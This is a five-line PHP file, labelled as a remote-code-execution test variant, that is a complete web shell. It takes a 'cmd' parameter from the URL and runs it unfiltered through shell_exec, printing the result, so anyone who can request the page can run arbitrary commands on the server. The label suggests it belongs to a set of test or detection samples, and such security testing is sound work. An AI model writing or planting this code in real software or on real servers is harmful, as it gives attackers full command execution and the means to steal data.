<?php
// RCE test variation #1166
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>